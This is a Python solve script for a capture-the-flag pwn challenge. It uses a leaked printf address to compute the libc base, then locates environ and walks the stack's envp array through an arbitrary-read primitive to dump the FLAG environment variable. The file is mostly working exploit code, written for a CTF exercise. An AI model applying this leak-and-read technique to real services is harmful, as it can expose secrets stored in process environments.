#!/usr/bin/env python3
"""
what is my pointer 2 - AlpacaHack Daily (pwn, Hard)

The binary leaks printf (a libc address) and then offers an arbitrary read
loop: give an address, it prints *(unsigned long*)addr. The flag is in the
FLAG environment variable, i.e. on the stack.

Each read is one network round-trip, and the remote kills the process after
180s, so we must keep the number of reads tiny. We use the matching libc
(Ubuntu 24.04, glibc 2.39-0ubuntu8) offsets directly:

    libc_base = printf_leak - printf_off
    &environ  = libc_base + environ_off   (points to the stack envp array)

Then we walk envp for "FLAG=" and dump it — only a dozen reads total.

Usage: python3 -I solve.py HOST PORT
"""
import re
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

PRINTF_OFF = 0x60100   # Ubuntu 24.04 glibc 2.39 (remote build)
ENVIRON_OFF = 0x20AD58  # verified by reading *environ -> stack addr


class IO:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=20)
        self.buf = b""

    def until(self, marker):
        while marker not in self.buf:
            d = self.s.recv(4096)
            if not d:
                break
            self.buf += d
        i = self.buf.find(marker) + len(marker)
        head, self.buf = self.buf[:i], self.buf[i:]
        return head

    def read_u64(self, addr):
        self.until(b"read:")
        self.s.sendall(f"{addr:x}\n".encode())
        return int(self.until(b"\n").strip().split()[-1], 16)

    def read_mem(self, addr, n):
        out = b""
        while len(out) < n:
            out += struct.pack("<Q", self.read_u64(addr + len(out)))
        return out[:n]


def main():
    io = IO(HOST, PORT)
    printf = int(re.search(rb"0x([0-9a-f]+)", io.until(b"\n")).group(1), 16)
    if printf & 0xFFF != PRINTF_OFF & 0xFFF:
        print(f"[!] unexpected printf page offset {printf & 0xfff:#x}", file=sys.stderr)
    base = printf - PRINTF_OFF
    envp = io.read_u64(base + ENVIRON_OFF)
    print(f"[*] libc base {base:#x}  envp {envp:#x}", file=sys.stderr)

    for i in range(300):
        strptr = io.read_u64(envp + i * 8)
        if strptr == 0:
            break
        if io.read_mem(strptr, 5) == b"FLAG=":
            data = b""
            while b"\x00" not in data:
                data += io.read_mem(strptr + len(data), 8)
            print(data[5:data.index(b"\x00")].decode())
            return
    print("FLAG not found in environ")


if __name__ == "__main__":
    main()
